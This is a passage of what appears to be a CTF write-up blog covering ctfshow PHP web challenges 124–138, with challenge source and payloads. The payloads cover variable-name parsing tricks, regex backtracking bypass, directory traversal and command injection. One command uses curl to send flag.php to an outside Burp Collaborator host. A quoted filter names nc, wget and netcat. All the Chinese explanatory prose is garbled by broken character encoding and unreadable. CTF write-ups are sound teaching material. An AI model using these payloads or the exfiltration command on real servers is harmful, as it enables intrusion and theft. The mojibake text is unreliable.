<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW.COM&#x27;</span>])&amp;&amp;!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fl0g&#x27;</span>]))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>PHPå˜é‡åç”±æ•°å­—å­—æ¯ä¸‹åˆ’çº¿ç»„æˆï¼Œæ˜¯æ²¡æœ‰.çš„<br>è¿™é‡Œä»å¤§ä½¬çš„æ–‡ç« äº†è§£åˆ°ï¼ŒGETæˆ–POSTæ–¹å¼ä¼ è¿›å»çš„å˜é‡å,ä¼šè‡ªåŠ¨å°†ç©ºæ ¼ + . [è½¬æ¢ä¸º_ã€‚<br>æœ‰ä¸€ç§ç‰¹æ®Šæƒ…å†µï¼Œç‰¹æ®Šå­—ç¬¦[GETæˆ–POSTæ–¹å¼ä¼ å‚æ—¶,å˜é‡åä¸­çš„[ä¹Ÿä¼šè¢«æ›¿æ¢ä¸º_,ä½†å…¶åçš„å­—ç¬¦å°±ä¸ä¼šè¢«æ›¿æ¢äº†<br>å¦‚ CTF[SHOW.COM&#x3D;&gt;CTF_SHOW.COM<br><strong>payload</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">POST: CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=<span class="keyword">echo</span> <span class="variable">$flag</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>å¾ˆæ˜æ˜¾è¿™ä¸ªè§£æ˜¯éé¢„æœŸçš„ï¼Œä¹Ÿä¸æ˜¯é€šè¿‡æ­£å¸¸æ­¥éª¤å¾—åˆ°flagçš„<br>å‡ºé¢˜äººçš„<strong>é¢„æœŸè§£</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">get: a=<span class="number">1</span>+fl0g=flag_give_me</span><br><span class="line">post: CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=<span class="title function_ invoke__">parse_str</span>(<span class="variable">$a</span>[<span class="number">1</span>])</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="web125"><a href="#web125" class="headerlink" title="web125"></a>web125</h1><p>payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">GET:?<span class="number">1</span>=flag.php </span><br><span class="line">POST:CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=<span class="title function_ invoke__">highlight_file</span>(<span class="variable">$_GET</span>[<span class="number">1</span>])</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="web126"><a href="#web126" class="headerlink" title="web126"></a>web126</h2><p>è¿™é¢˜çš„å§¿åŠ¿åŒweb124çš„é¢„æœŸè§£ï¼Œå³</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">get: a=<span class="number">1</span>+fl0g=flag_give_me</span><br><span class="line">post: CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=<span class="title function_ invoke__">parse_str</span>(<span class="variable">$a</span>[<span class="number">1</span>])</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="web127"><a href="#web127" class="headerlink" title="web127"></a>web127</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$ctf_show</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$flag</span>);</span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">//ç‰¹æ®Šå­—ç¬¦æ£€æµ‹</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$url</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\`|\~|\!|\@|\#|\^|\*|\(|\)|\\$|\_|\-|\+|\&#123;|\;|\:|\[|\]|\&#125;|\&#x27;|\&quot;|\&lt;|\,|\&gt;|\.|\\\|\//&#x27;</span>, <span class="variable">$url</span>))&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">waf</span>(<span class="variable">$url</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;å—¯å“¼ï¼Ÿ&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ctf_show</span>===<span class="string">&#x27;ilove36d&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿‡æ»¤äº†<code>_</code>ï¼Œç»•è¿‡æ–¹å¼è¿˜æ˜¯åŒweb123<br>payload:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?ctf show=ilove36d</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="web128"><a href="#web128" class="headerlink" title="web128"></a>web128</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$f1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f1&#x27;</span>];</span><br><span class="line"><span class="variable">$f2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f2&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">check</span>(<span class="variable">$f1</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">call_user_func</span>(<span class="title function_ invoke__">call_user_func</span>(<span class="variable">$f1</span>,<span class="variable">$f2</span>)));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;å—¯å“¼ï¼Ÿ&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> !<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[0-9]|[a-z]/i&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">&#125; </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="gettext-æ‹“å±•çš„åº”ç”¨"><a href="#gettext-æ‹“å±•çš„åº”ç”¨" class="headerlink" title="gettext()æ‹“å±•çš„åº”ç”¨"></a>gettext()æ‹“å±•çš„åº”ç”¨</h3><p>å¾ˆéªšçš„ä¸€ä¸ªæ“ä½œï¼Œå‚è€ƒæ–‡ç« :</p>
<blockquote>
<p><a href="https://www.cnblogs.com/lost-1987/articles/3309693.html">å…³äºphpä¸­gettextçš„ç”¨æ³•ï¼Ÿ</a></p>
</blockquote>
<blockquote>
<p><a href="https://www.php.net/manual/zh/book.gettext.php">Gettext</a></p>
</blockquote>
<p>åœ¨å¼€å¯è¯¥æ‹“å±•å _() ç­‰æ•ˆäº gettext(),å¦‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">gettext</span>(<span class="string">&quot;phpinfo&quot;</span>);</span><br><span class="line">ç»“æœ  phpinfo</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">_</span>(<span class="string">&quot;phpinfo&quot;</span>);</span><br><span class="line">ç»“æœ phpinfo</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="call-user-func-å‡½æ•°-1"><a href="#call-user-func-å‡½æ•°-1" class="headerlink" title="call_user_func()å‡½æ•°"></a>call_user_func()å‡½æ•°</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">call_user_func</span> ( <span class="keyword">callable</span> <span class="variable">$callback</span> [, <span class="keyword">mixed</span> <span class="variable">$parameter</span> [, <span class="keyword">mixed</span> $... ]] )</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>è§£é‡Š:</strong></p>
<blockquote>
<p>ç¬¬ä¸€ä¸ªå‚æ•° callback æ˜¯è¢«è°ƒç”¨çš„å›è°ƒå‡½æ•°ï¼Œå…¶ä½™å‚æ•°æ˜¯å›è°ƒå‡½æ•°çš„å‚æ•°ã€‚</p>
</blockquote>
<p>æ‰€ä»¥<code>call_user_func(&#39;_&#39;,&#39;phpinfo&#39;)</code>ç›¸å½“äº<code>gettext(&quot;phpinfo&quot;)</code><br>è¿™é¢˜å¯ä»¥åˆ©ç”¨get_defined_vars</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">get_defined_vars</span>() å‡½æ•°è¿”å›ç”±æ‰€æœ‰å·²å®šä¹‰å˜é‡æ‰€ç»„æˆçš„æ•°ç»„ã€‚</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿™é¢˜å¯ä»¥åˆ©ç”¨get_defined_vars</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">get_defined_vars</span>() å‡½æ•°è¿”å›ç”±æ‰€æœ‰å·²å®šä¹‰å˜é‡æ‰€ç»„æˆçš„æ•°ç»„ã€‚</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>payload:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?f1=_&amp;f2=get_defined_vars</span><br></pre></td></tr></table></figure>

<h1 id="web129"><a href="#web129" class="headerlink" title="web129"></a>web129</h1><p>ç›®å½•ç©¿è¶Š<br>payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?f=/ctfshow/../../../../<span class="keyword">var</span>/www/html/flag.php</span><br></pre></td></tr></table></figure>

<h1 id="web130"><a href="#web130" class="headerlink" title="web130"></a>web130</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;f&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$f</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/.+?ctfshow/is&#x27;</span>, <span class="variable">$f</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;bye!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$f</span>, <span class="string">&#x27;ctfshow&#x27;</span>) === <span class="literal">FALSE</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;bye!!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªé¢˜ä¹ŸæŒºéªšçš„ï¼Œæœ‰å¾ˆå¤šç§è§£æ³•ï¼Œé¦–å…ˆæ˜¯åˆ©ç”¨æ­£åˆ™æœ€å¤§å›æº¯æ¬¡æ•°ç»•è¿‡<br>æ­£åˆ™æœ€å¤§å›æº¯æ¬¡æ•°ç»•è¿‡<br>å›æº¯ç°è±¡ï¼š</p>
<blockquote>
<p>PHPä¸­ï¼Œä¸ºäº†é˜²æ­¢ä¸€æ¬¡æ­£åˆ™åŒ¹é…è°ƒç”¨çš„åŒ¹é…è¿‡ç¨‹è¿‡å¤§ä»è€Œé€ æˆè¿‡å¤šçš„èµ„æºæ¶ˆè€—ï¼Œé™å®šäº†ä¸€æ¬¡æ­£åˆ™åŒ¹é…ä¸­è°ƒç”¨åŒ¹é…å‡½æ•°çš„æ¬¡æ•°ã€‚ å›æº¯ä¸»è¦æœ‰ä¸¤ç§<br>1ã€è´ªå©ªæ¨¡å¼ä¸‹ï¼Œpatternéƒ¨åˆ†è¢«åŒ¹é…ï¼Œä½†æ˜¯ååŠéƒ¨åˆ†æ²¡åŒ¹é…ï¼ˆåŒ¹é…â€œç”¨åŠ›è¿‡çŒ›â€ï¼ŒæŠŠåé¢çš„éƒ¨åˆ†ä¹ŸåŒ¹é…è¿‡äº†ï¼‰æ—¶åŒ¹é…å¼å›é€€çš„æ“ä½œï¼Œåœ¨å‡ºç°<em>ã€+æ—¶å®¹æ˜“äº§ç”Ÿã€‚<br>2ã€éè´ªå©ªæ¨¡å¼ä¸‹ï¼Œå­—ç¬¦ä¸²éƒ¨åˆ†è¢«åŒ¹é…ï¼Œä½†ååŠéƒ¨åˆ†æ²¡åŒ¹é…å®Œå…¨ï¼ˆåŒ¹é…â€œç”¨åŠ›ä¸å¤Ÿâ€ï¼Œéœ€è¦é€šé…ç¬¦å†åŒ¹é…ä¸€å®šçš„é•¿åº¦ï¼‰ï¼Œåœ¨å‡ºç°</em>?ã€+?æ—¶å®¹æ˜“äº§ç”Ÿã€‚</p>
</blockquote>
<p>å½“ä¼ å…¥å­—ç¬¦ä¸²åœ¨æ­£åˆ™åŒ¹é…æ—¶å›æº¯æ¬¡æ•°è¶…è¿‡é™åˆ¶ï¼ˆé»˜è®¤1000000ï¼Œå¯è°ƒæ•´ï¼‰æ—¶ï¼Œä¼šæŠ¥é”™è¿”å›false<br>å…³äºè¿™ç§æ–¹æ³•ï¼Œé¢˜ç›®ä¸­ä¹Ÿç»™å‡ºäº†æç¤º<br>very very veryï¼ˆçœç•¥25ä¸‡ä¸ªveryï¼‰ctfshow<br>payload(pyè„šæœ¬):</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">url=<span class="string">&quot;http://07b28eb7-15d4-4250-be72-33a58b73dba1.chall.ctf.show/&quot;</span></span><br><span class="line">data=&#123;</span><br><span class="line">  <span class="string">&#x27;f&#x27;</span>:<span class="string">&#x27;very&#x27;</span>*<span class="number">250000</span>+<span class="string">&#x27;ctfshow&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">r=requests.<span class="title function_ invoke__">post</span>(url,data=data)</span><br><span class="line"><span class="keyword">print</span>(r.text)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>æ‰§è¡Œåï¼Œå› ä¸ºè¶…å‡ºäº†<code>preg_match</code>çš„å›æº¯æ¬¡æ•°ï¼ŒæŠ¥é”™è¿”å›falseï¼Œè¾¾åˆ°ç»•è¿‡çš„æ•ˆæœï¼ŒåŒæ—¶å› ä¸ºPOSTä¼ å…¥çš„<code>f</code>ä¸­æœ‰<code>ctfshow</code>ï¼Œç¬¬äºŒä¸ªåˆ¤æ–­ä¹Ÿè¢«ç»•è¿‡ï¼Œè¾“å‡ºflag<br>è¿˜æœ‰ä¸¤ä¸ªæ¯”è¾ƒå¼ºçš„å§¿åŠ¿â€¦é¦–å…ˆæ˜¯hintä¸­ç»™å‡ºçš„<code>f=ctfshow</code>ï¼Œå› ä¸ºåœ¨ç¬¬ä¸€ä¸ªæ­£åˆ™åŒ¹é…ä¸­</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/.+?ctfshow/is&#x27;</span>, <span class="variable">$f</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;bye!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>.</code>è¡¨ç¤º<code>ä»»æ„å•ä¸ªå­—ç¬¦</code>ï¼Œ<code>+</code>è¡¨ç¤º<code>å¿…é¡»åŒ¹é…1æ¬¡æˆ–å¤šæ¬¡</code>ï¼Œ<code>+?</code>è¡¨ç¤º <code>é‡å¤1æ¬¡æˆ–æ›´å¤šæ¬¡ï¼Œä½†å°½å¯èƒ½å°‘é‡å¤</code><br>æ‰€ä»¥åœ¨ctfshowå‰é¢å¿…é¡»æœ‰è‡³å°‘ä¸€ä¸ªå­—ç¬¦ï¼Œæ‰ä¼šè¿”å›True<br>è¿˜æœ‰ä¸€ç§å§¿åŠ¿æ˜¯<code>æ•°ç»„ç»•è¿‡</code>ï¼Œä¼ å…¥æ•°ç»„æ—¶ï¼Œstriposä¼šè¿”å›<code>null</code>ï¼Œ<code>null!=false</code><br>payload:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">POST:f=ctfshow</span><br><span class="line">POST:f[]=a</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="web131"><a href="#web131" class="headerlink" title="web131"></a>web131</h1><p>è€ƒå¯Ÿ<strong>æ­£åˆ™æœ€å¤§å›æº¯æ¬¡æ•°ç»•è¿‡</strong>ï¼Œç”¨ä¸Šé¢˜çš„ç¬¬ä¸€ä¸ªå§¿åŠ¿(è®°å¾—æŠŠ<code>ctfshow</code> æ”¹æˆ<code>36Dctfshow</code>)</p>
<h1 id="web132"><a href="#web132" class="headerlink" title="web132"></a>web132</h1><p>æŸ¥çœ‹robots.txtå‘ç°æç¤º,è®¿é—®å¾—åˆ°æºç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$username</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$password</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    <span class="variable">$code</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$code</span> === <span class="title function_ invoke__">mt_rand</span>(<span class="number">1</span>,<span class="number">0x36D</span>) &amp;&amp; <span class="variable">$password</span> === <span class="variable">$flag</span> || <span class="variable">$username</span> ===<span class="string">&quot;admin&quot;</span>)&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$code</span> == <span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>mt_rand()<br>ç”¨äºç”Ÿæˆéšæœºæ•°<br>æ³¨æ„è¿™ä¸ªåˆ¤æ–­å¼<br>if($code &#x3D;&#x3D;&#x3D; mt_rand(1,0x36D) &amp;&amp; $password &#x3D;&#x3D;&#x3D; $flag || $username &#x3D;&#x3D;&#x3D;â€adminâ€)<br>è¿™é‡Œä¸‰ä¸ªéƒ½æ˜¯å¼ºç­‰äºï¼Œä¸åƒå¼±ç­‰äºä¸€æ ·å¥½ç»•è¿‡ï¼Œè€Œä¸”å‰ä¸¤ä¸ªæ¡ä»¶å¯ä»¥è¯´æ˜¯ä¸å¯èƒ½åŒæ—¶è¾¾æˆçš„,è¿™é‡Œæ˜¯åˆ©ç”¨äº†æ¯”è¾ƒç¬¦çš„ä¼˜å…ˆçº§<br>æ‰€ä»¥å³ä½¿å‰ä¸¤ä¸ªæ¡ä»¶ä¸æ»¡è¶³ï¼Œåªè¦ç¬¬ä¸‰ä¸ªæ¡ä»¶username&#x3D;&#x3D;&#x3D;â€adminâ€æ»¡è¶³å³å¯,åŒæ—¶ä»¤code&#x3D;adminå³å¯è¾“å‡ºflag</p>
<p>payload:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?username=admin&amp;code=admin&amp;password=<span class="number">1</span></span><br></pre></td></tr></table></figure>

<h1 id="web133"><a href="#web133" class="headerlink" title="web133"></a>web133</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">//flag.php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$F</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;F&#x27;</span>])&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/system|nc|wget|exec|passthru|netcat/i&#x27;</span>, <span class="variable">$F</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$F</span>,<span class="number">0</span>,<span class="number">6</span>));</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;6ä¸ªå­—æ¯éƒ½è¿˜ä¸å¤Ÿå‘€?!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>é™åˆ¶æ‰§è¡Œå‰6ä¸ªå­—ç¬¦ï¼Œè¿™é¢˜å‚è€ƒ<a href="https://blog.csdn.net/qq_46091464/article/details/109095382">Firebaskyå¸ˆå‚…çš„wp</a>ï¼Œåˆæ˜¯æ–°å§¿åŠ¿ï¼Œå…·ä½“çš„åŸç†çœ‹å¸ˆå‚…çš„åšå®¢ã€‚<br>å…ˆæ‰“å¼€burpï¼Œè·å¾—ä¸€ä¸ªåŸŸå</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_1.png"></p>
<p>payloadï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># payload </span></span><br><span class="line"><span class="comment">#å…¶ä¸­-F ä¸ºå¸¦æ–‡ä»¶çš„å½¢å¼å‘é€postè¯·æ±‚</span></span><br><span class="line"><span class="comment">#xxæ˜¯ä¸Šä¼ æ–‡ä»¶çš„nameå€¼ï¼Œflag.phpå°±æ˜¯ä¸Šä¼ çš„æ–‡ä»¶ </span></span><br><span class="line">?F=`<span class="variable">$F</span>`;+curl -X POST -F xx=@flag.php  http:<span class="comment">//8clb1g723ior2vyd7sbyvcx6vx1ppe.burpcollaborator.net</span></span><br></pre></td></tr></table></figure>


<p>æˆ‘ä»¬ä¼ é€’?F&#x3D;<code>$F</code>;+sleep 3å¥½åƒç½‘ç«™ç¡®å®sleepäº†ä¸€ä¼šè¯´æ˜çš„ç¡®æ‰§è¡Œäº†å‘½ä»¤<br><strong>é‚£ä¸ºä»€ä¹ˆä¼šè¿™æ ·ï¼Ÿ</strong><br>å› ä¸ºæ˜¯æˆ‘ä»¬ä¼ é€’çš„<code>$F</code>;+sleep 3ã€‚å…ˆè¿›è¡Œsubstr()å‡½æ•°æˆªæ–­ç„¶åå»æ‰§è¡Œeval()å‡½æ•°<br>è¿™ä¸ªå‡½æ•°çš„ä½œç”¨æ˜¯æ‰§è¡Œphpä»£ç ï¼Œ<code>æ˜¯shell_exec()å‡½æ•°çš„ç¼©å†™ï¼Œç„¶åå°±å»å‘½ä»¤æ‰§è¡Œã€‚ è€Œ$Få°±æ˜¯æˆ‘ä»¬è¾“å…¥çš„</code>$F<code>;+sleep 3 ä½¿ç”¨æœ€åæ‰§è¡Œçš„ä»£ç åº”è¯¥æ˜¯ </code>$F<code>;+sleep 3</code>,å°±æ‰§è¡ŒæˆåŠŸ<br>è¿™é‡Œå¯èƒ½æœ‰ç‚¹ç»•ï¼Œæ…¢æ…¢ç†è§£</p>
<h1 id="web134"><a href="#web134" class="headerlink" title="web134"></a>web134</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?_POST[key1]=<span class="number">36</span>d&amp;_POST[key2]=<span class="number">36</span>d</span><br></pre></td></tr></table></figure>


<h1 id="web135"><a href="#web135" class="headerlink" title="web135"></a>web135</h1><p>åœ¨133çš„åŸºç¡€ä¸Šå¢åŠ äº†curlå’Œå…¶ä»–ä¸€äº›å­—ç¬¦çš„è¿‡æ»¤ï¼Œè¿™æ—¶å€™å…¶å®å¯ä»¥é€šè¿‡pingå¾—åˆ°flagçš„</p>
<p>payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">F=`<span class="variable">$F</span> `;nl f*&gt;xxx</span><br></pre></td></tr></table></figure>


<p>è®¿é—®url&#x2F;xxxå³å¯å¾—åˆ°flag</p>
<h1 id="web136"><a href="#web136" class="headerlink" title="web136"></a>web136</h1><p>å…¶å®æ˜¯å†135çš„åŸºç¡€ä¸Šå¢åŠ äº†è¿‡æ»¤<code>&gt;&lt; </code><br>ä½†æ˜¯linuxä¸­è¿˜å¯ä»¥ç”¨teeå†™æ–‡ä»¶</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">ls|tee xxx</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>æˆ‘ä»¬å…ˆæ¥çœ‹ä¸‹å½“å‰ç›®å½•ä¸‹æœ‰å•¥æ–‡ä»¶ï¼Œè®¿é—®url&#x2F;xxxå‘ç°åªæœ‰ä¸€ä¸ªindex.php<br>é‚£æˆ‘ä»¬å†å»çœ‹çœ‹æ ¹ç›®å½•ä¸‹æœ‰ä»€ä¹ˆæ–‡ä»¶</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">ls /|tee xxx</span><br></pre></td></tr></table></figure>


<p>å¾—åˆ° f149_15_h3r3<br>æœ€åç›´æ¥æ‰“å¼€å°±å¯ä»¥äº†</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">nl  /f149_15_h3r3|tee xxx</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h1 id="web137"><a href="#web137" class="headerlink" title="web137"></a>web137</h1><p>æ²¡æœ‰éš¾åº¦çš„ä¸€é“é¢˜ï¼Œè€ƒå¯Ÿè°ƒç”¨ç±»ä¸­çš„å‡½æ•°</p>
<p>payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">ctfshow=ctfshow::<span class="variable constant_">getflag</span></span><br></pre></td></tr></table></figure>


<p>PHPä¸­çš„<code>::</code> æŒ‡é™æ€æ–¹æ³•</p>
<h1 id="web138"><a href="#web138" class="headerlink" title="web138"></a>web138</h1><p>åœ¨ä¸Šä¸€é¢˜çš„åŸºç¡€ä¸Šè¿‡æ»¤äº†å†’å·<br>è¿™æ—¶å€™å°±è€ƒå¯Ÿæˆ‘ä»¬å¯¹call_user_funcå‡½æ•°çš„ä½¿ç”¨äº†ï¼Œcall_user_funcä¸­ä¸ä½†å¯ä»¥ä¼ å­—ç¬¦ä¸²ä¹Ÿå¯ä»¥ä¼ æ•°ç»„ã€‚<br>å…·ä½“ä½¿ç”¨æ–¹æ³•å¦‚ä¸‹</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="keyword">array</span>(<span class="variable">$classname</span>, <span class="string">&#x27;say_hello&#x27;</span>));</span><br><span class="line">è¿™æ—¶å€™ä¼šè°ƒç”¨ classnameä¸­çš„ say_helloæ–¹æ³•</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">ctfshow[<span class="number">0</span>]=ctfshow&amp;ctfshow[<span class="number">1</span>]=getFlag</span><br><span class="line"></span><br></pre></td></tr></table></figure>


